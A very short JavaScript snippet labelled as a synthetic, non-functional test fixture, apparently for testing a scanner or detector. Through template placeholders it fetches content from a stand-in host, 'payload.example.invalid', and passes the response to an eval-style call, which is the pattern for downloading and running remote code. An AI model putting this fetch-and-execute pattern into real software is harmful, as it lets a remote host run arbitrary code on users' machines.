// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

{{AXIOS_GET}}("https://payload.example.invalid/n").then((r) => {
  {{EVAL}}(r.data);
});
